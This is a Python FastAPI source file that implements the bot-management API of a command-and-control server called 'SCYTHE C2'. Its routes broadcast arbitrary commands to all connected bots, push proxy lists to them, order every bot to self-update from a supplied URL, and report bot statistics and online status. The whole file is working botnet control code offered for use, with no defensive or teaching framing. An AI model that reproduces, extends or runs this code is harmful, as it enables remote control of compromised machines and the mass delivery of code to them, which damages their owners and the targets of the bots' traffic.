"""
Botnet management routes for SCYTHE C2.
- GET  /api/botnet/stats          → Get botnet statistics
- HEAD /api/botnet/status         → Health check for botnet service
- POST /api/botnet/broadcast      → Send command to all bots
- POST /api/botnet/update-proxies → Update proxies on all bots
- POST /api/botnet/update-self    → Self-update all bots
- GET  /api/botnet/online         → List online bots
"""

from fastapi import APIRouter, Request, HTTPException, Response
from fastapi.responses import JSONResponse
from pydantic import BaseModel
from typing import Optional, List, Dict, Any

from app.core.logger import logger, log_bot_event
from app.core.models import BotStats

router = APIRouter(prefix="/api/botnet", tags=["botnet"])


class BroadcastCommand(BaseModel):
    """Model for broadcasting a command to all bots."""
    cmd: str
    payload: Optional[Dict[str, Any]] = None


class UpdateSelfRequest(BaseModel):
    """Model for self-update command."""
    url: str


@router.get("/stats", response_model=BotStats)
async def get_botnet_stats(request: Request):
    """
    Get botnet statistics:
    - active: number of bots currently connected
    - total: total bots registered
    - avg_rpm: average requests per minute from all bots
    - total_requests: total requests sent by all bots (all time)
    """
    botnet_manager = request.app.state.botnet_manager
    stats = await botnet_manager.get_bot_stats()
    logger.debug(f"Botnet stats: {stats}")
    return stats


@router.head("/status")
async def botnet_status(request: Request):
    """
    Health check endpoint for botnet service.
    Returns 200 if the botnet manager is operational.
    """
    try:
        botnet_manager = request.app.state.botnet_manager
        if botnet_manager._running:
            return Response(status_code=200)
        else:
            return Response(status_code=503, content={"detail": "Botnet service not running"})
    except Exception:
        return Response(status_code=503, content={"detail": "Botnet service unavailable"})


@router.post("/broadcast")
async def broadcast_command(request: Request, cmd_data: BroadcastCommand):
    """
    Broadcast a custom command to all connected bots.
    Admin-only (protected by triple-click access in frontend).
    """
    botnet_manager = request.app.state.botnet_manager
    try:
        command = {"cmd": cmd_data.cmd}
        if cmd_data.payload:
            command.update(cmd_data.payload)

        # FIX: gunakan method yang lock-aware daripada direct dict access
        bot_ids = await botnet_manager.get_active_bot_ids()
        if not bot_ids:
            logger.warning(f"Broadcast command '{cmd_data.cmd}' skipped: no bots connected")
            return JSONResponse(content={
                "success": True,
                "message": f"Command '{cmd_data.cmd}' not sent: no bots connected",
                "bots_reached": 0
            })

        await botnet_manager.broadcast_command(command)
        logger.info(f"Broadcast command '{cmd_data.cmd}' to {len(bot_ids)} bots")
        return JSONResponse(content={
            "success": True,
            "message": f"Command '{cmd_data.cmd}' broadcasted to {len(bot_ids)} bots",
            "bots_reached": len(bot_ids)
        })
    except Exception as e:
        logger.error(f"Broadcast failed: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/update-proxies")
async def update_bot_proxies(request: Request):
    """
    Send the latest proxy list to all connected bots.
    """
    botnet_manager = request.app.state.botnet_manager
    proxy_manager = request.app.state.proxy_manager
    try:
        proxies = await proxy_manager.get_alive_proxies()
        proxy_strings = [str(p) for p in proxies]
        command = {
            "cmd": "proxy_update",
            "proxies": proxy_strings
        }

        # FIX: gunakan lock-aware method
        bot_ids = await botnet_manager.get_active_bot_ids()
        if not bot_ids:
            logger.warning("Update proxies skipped: no bots connected")
            return JSONResponse(content={
                "success": True,
                "message": "No bots connected, proxy update not sent",
                "bots_reached": 0
            })

        await botnet_manager.broadcast_command(command)
        logger.info(f"Sent proxy update ({len(proxy_strings)} proxies) to {len(bot_ids)} bots")
        return JSONResponse(content={
            "success": True,
            "message": f"Sent {len(proxy_strings)} proxies to {len(bot_ids)} bots",
            "bots_reached": len(bot_ids)
        })
    except Exception as e:
        logger.error(f"Failed to update bot proxies: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/update-self")
async def update_bot_self(request: Request, update_req: UpdateSelfRequest):
    """
    Send self-update command to all bots.
    """
    botnet_manager = request.app.state.botnet_manager
    try:
        command = {
            "cmd": "update_self",
            "url": update_req.url
        }

        # FIX: gunakan lock-aware method
        bot_ids = await botnet_manager.get_active_bot_ids()
        if not bot_ids:
            logger.warning("Self-update skipped: no bots connected")
            return JSONResponse(content={
                "success": True,
                "message": "No bots connected, self-update not sent",
                "bots_reached": 0
            })

        await botnet_manager.broadcast_command(command)
        logger.info(f"Sent self-update command to {len(bot_ids)} bots: {update_req.url}")
        return JSONResponse(content={
            "success": True,
            "message": f"Self-update command sent to {len(bot_ids)} bots. URL: {update_req.url}",
            "bots_reached": len(bot_ids)
        })
    except Exception as e:
        logger.error(f"Self-update failed: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.get("/online")
async def get_online_bots(request: Request):
    """
    Get a list of currently online bot IDs.
    Useful for debugging or admin monitoring.
    """
    botnet_manager = request.app.state.botnet_manager
    bot_ids = await botnet_manager.get_active_bot_ids()
    return {
        "count": len(bot_ids),
        "bots": bot_ids
    }